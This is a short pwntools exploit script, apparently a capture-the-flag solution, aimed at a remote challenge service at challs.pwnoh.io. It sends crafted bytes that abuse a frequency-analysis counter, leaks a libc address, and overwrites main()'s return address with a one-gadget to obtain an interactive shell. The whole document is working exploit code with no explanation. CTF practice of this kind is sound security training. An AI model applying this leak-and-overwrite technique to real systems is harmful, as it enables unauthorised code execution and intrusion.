from pwn import *

r = remote("challs.pwnoh.io", 13374)

payload = b"\xfd" * 0x109  # largest += 0x109
payload += b"\xff" * 0x36  # filename += 0x36

r.sendlineafter(b"Enter text to perform frequency analysis on:\n", payload)

# leak libc
r.recvuntil(b"showing up ")
libc = int(r.recvuntil(b" ")[:-1]) - 0x21C87
log.info(f"libc base: {hex(libc)}")
oneshot = libc + 0x10A2FC

# overwrite return address of main() with address of oneshot gadget
r.sendlineafter(b"Enter filename to save file to (leave blank for default)\n", p64(oneshot))

r.interactive()
